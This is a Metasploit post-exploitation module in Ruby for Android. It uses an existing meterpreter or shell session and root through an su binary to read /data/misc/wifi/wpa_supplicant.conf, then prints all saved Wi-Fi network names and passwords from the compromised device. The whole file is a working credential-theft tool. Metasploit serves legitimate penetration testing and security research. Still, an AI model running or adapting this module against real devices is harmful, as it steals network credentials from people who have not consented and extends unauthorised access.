##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  Rank = NormalRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Android::Priv
  include Msf::Post::Android::System

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Displays wireless SSIDs and PSKs",
        'Description'   => %q{
            This module displays all wireless AP creds saved on the target device.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
            'Auxilus'
        ],
        'SessionTypes'  => [ 'meterpreter', 'shell' ],
        'Platform'       => 'android',
      }
    ))
    register_options([
      OptString.new('SU_BINARY', [true, 'The su binary to execute root commands', 'su'])
    ])
  end

  def run
    unless file?("/system/xbin/#{datastore['SU_BINARY']}")
      print_error("No su binary found")
      return
    end

    data = su_exec("cat /data/misc/wifi/wpa_supplicant.conf", datastore['SU_BINARY'])
    print_line(data)
  end

end
